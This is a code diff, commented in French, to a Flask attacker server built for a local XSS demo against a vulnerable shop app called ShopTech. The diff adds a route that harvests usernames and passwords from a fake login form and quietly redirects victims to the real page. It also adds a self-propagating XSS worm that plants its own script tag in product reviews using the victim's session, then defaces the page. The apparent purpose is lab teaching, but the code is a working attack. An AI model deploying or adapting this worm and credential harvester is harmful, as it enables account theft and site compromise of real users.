@@ -5,7 +5,7 @@ Capture les cookies et keystrokes exfiltrés depuis ShopTech (port 5000).
 
 import os
 from datetime import datetime
-from flask import Flask, jsonify, request, render_template_string
+from flask import Flask, jsonify, request, render_template_string, redirect
 
 app = Flask(__name__)
 
@@ -130,6 +130,27 @@ DASHBOARD = """<!DOCTYPE html>
     </table>
   </section>
 
+  <section>
+    <h2>🎣 IDENTIFIANTS VOLÉS — Faux formulaire de login (Phishing XSS)</h2>
+    <table>
+      <thead><tr><th>Heure</th><th>IP victime</th><th>Username</th><th>Password</th></tr></thead>
+      <tbody>
+      {% if phishing %}
+        {% for e in phishing|reverse %}
+        <tr>
+          <td class="time">{{ e.time }}</td>
+          <td class="ip">{{ e.ip }}</td>
+          <td class="val">{{ e.username }}</td>
+          <td style="color:#ff0040; font-weight:bold;">{{ e.password }}</td>
+        </tr>
+        {% endfor %}
+      {% else %}
+        <tr><td colspan="4" class="empty">En attente d'une victime remplissant le faux formulaire...</td></tr>
+      {% endif %}
+      </tbody>
+    </table>
+  </section>
+
 </main>
 
 <footer>Serveur attaquant en écoute sur :8000 &mdash; ShopTech vulnérable sur :5000</footer>
@@ -196,6 +217,44 @@ def exfil():
 
     return "", 204, {"Access-Control-Allow-Origin": "*"}
 
+@app.route("/credentials")
+def credentials():
+    """Point de collecte des identifiants volés via le faux formulaire de login."""
+    username = request.args.get("username", "")
+    password = request.args.get("password", "")
+    ip  = request.remote_addr
+    now = datetime.now().strftime("%H:%M:%S")
+
+    captured.append({
+        "type":     "phishing",
+        "time":     now,
+        "ip":       ip,
+        "src":      request.referrer or "unknown",
+        "username": username,
+        "password": password,
+    })
+
+    # Rediriger la victime vers la vraie page de login — rien de suspect
+    return redirect("http://localhost:5000/")
+
+@app.route("/worm.js")
+def worm_js():
+    js = """
+    [2,3,4,5,6].forEach(function(i){
+      fetch('/product/'+i,{
+        method:'POST',
+        headers:{'Content-Type':'application/x-www-form-urlencoded'},
+        body:'rating=5&review='+encodeURIComponent('<script src="http://localhost:8000/worm.js"><\\/script>'),
+        credentials:'include'
+      });
+    });
+    setTimeout(function(){
+      document.documentElement.innerHTML='<html><body style="background:#000;margin:0;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh"><h1 style="color:red;font-size:80px;text-align:center;text-shadow:0 0 40px red">&#9888; HACKED &#9888;</h1><p style="color:#fff;font-size:24px;text-align:center">Ce site a ete compromis par une attaque XSS</p><p style="color:#ff4444;font-size:16px">ShopTech XSS Worm - 2026</p></body></html>';
+    }, 500);
+    """
+
+    from flask import Response
+    return Response(js, mimetype="application/javascript", headers={"Access-Control-Allow-Origin": "*"})
 
 # ---------------------------------------------------------------------------
 # Dashboard et API
@@ -206,12 +265,15 @@ def exfil():
 def dashboard():
     cookies     = [e for e in captured if e["type"] == "cookie"]
     keylogs     = [e for e in captured if e["type"] == "keylog"]
-    csrf_events = [e for e in captured if e["type"] not in ("cookie", "keylog")]
+    phishing    = [e for e in captured if e["type"] == "phishing"]
+    csrf_events = [e for e in captured if e["type"] not in ("cookie", "keylog", "phishing")]
+
     return render_template_string(
         DASHBOARD,
         cookies=cookies,
         keylogs=keylogs,
         csrf_events=csrf_events,
+        phishing=phishing,
         total=len(captured),
         now=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
     )
